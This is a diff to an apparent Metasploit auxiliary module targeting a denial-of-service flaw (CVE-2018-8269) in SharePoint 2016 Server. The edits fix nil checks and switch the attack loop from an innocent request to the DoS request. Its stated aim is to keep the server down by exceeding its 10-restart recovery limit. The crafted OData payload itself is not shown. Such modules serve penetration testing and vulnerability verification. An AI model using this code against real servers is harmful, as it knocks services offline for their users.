@@ -12,15 +12,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-        'Name'        => 'DOS Expoit in SharePoint 2016 Server',
+        'Name'        => 'DOS Vulnerability in SharePoint 2016 Server',
         'Description'    => %q{
           A vulnerability in Microsoft SharePoint Server could allow a remote attacker to make the server unavailable.
-          The vulnerability is a result of the dependency SharePoint has in Microsoft.Data. OData library which was
+          The vulnerability is a result of the dependency SharePoint has in Microsoft.Data.OData library which was 
           vulnerable to remote DOS (See CVE-2018-8269). The exploit is done by sending a crafted request that contains
           an OData filter that triggers the vulnerability in Microsoft.Data.OData library. Sending such request, will
           terminate the process that runs the server. By default, SharePoint server is configured to recover a
-          terminated process, but it will do so only 10 times. If more than 10 malicious requests are sent in 5 minutes
-           interval, the server will not recover and will be down until it is manually restarted.
+          terminated process, but it will do so only 10 times. If more than 10 malicious requests are sent in 5
+          minutes interval, the server will not recover and will be down until it is manually restarted.
       },
       'Author'         =>
         [
@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Auxiliary
           [
               [ 'Microsoft Office SharePoint Server 2016', { } ],
           ],
+
           ))
 
     register_options(
@@ -47,6 +48,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD',  [true, 'The password to login with']),
         OptString.new('VHOST',  [true, 'HTTP server virtual host'])
       ], self.class)
+      
   end
 
   def fetch_auth_cookie
@@ -68,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
                                 'uri' => normalize_uri(token_api_uri),
                                 'cookie' => cookie,
                             })
-    if res&get_xml_document.nil?
+    if res.nil?
       fail_with(Failure::UnexpectedReply, "Empty context response")
     end
     res.get_xml_document.xpath('//d:FormDigestValue').text
@@ -83,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_request(reps)
-    batch_uri = "/_api/$batch"
+    vuln_api_uri = "/_api/$batch"
     cookie = datastore['COOKIE']
 
     data = Rex::MIME::Message.new
@@ -96,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
     )
     send_request_cgi({
                            'method'   => 'POST',
-                           'uri'      => normalize_uri(batch_uri),
+                           'uri'      => normalize_uri(vuln_api_uri),
                            'ctype'  => "multipart/mixed; boundary=#{data.bound}",
                            'data'   => data.to_s,
                            'cookie' => cookie,
@@ -111,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Sending DOS malicious requests...")
     (0..10).each {|i|
       print_status("Countdown #{10 - i}...")
-      send_innocent_request #TODO change this
+      send_dos_request
       sleep(60)
     }
 
@@ -123,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Sending innocent request...")
     res = send_innocent_request
 
-    if res&.code.nil? && res.code == 200
+    if res && res.code == 200
       print_good("Server responded 200 to innocent request")
     else
       print_bad("Server response " + res.code.to_s + " to innocent request")
@@ -133,7 +135,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Sending malicious request...")
     res = send_dos_request
 
-    if res&.code.nil?
+    if res.nil?
       Exploit::CheckCode::Vulnerable
     else
       print_bad("Server response " + res.code.to_s + " to malicious request")
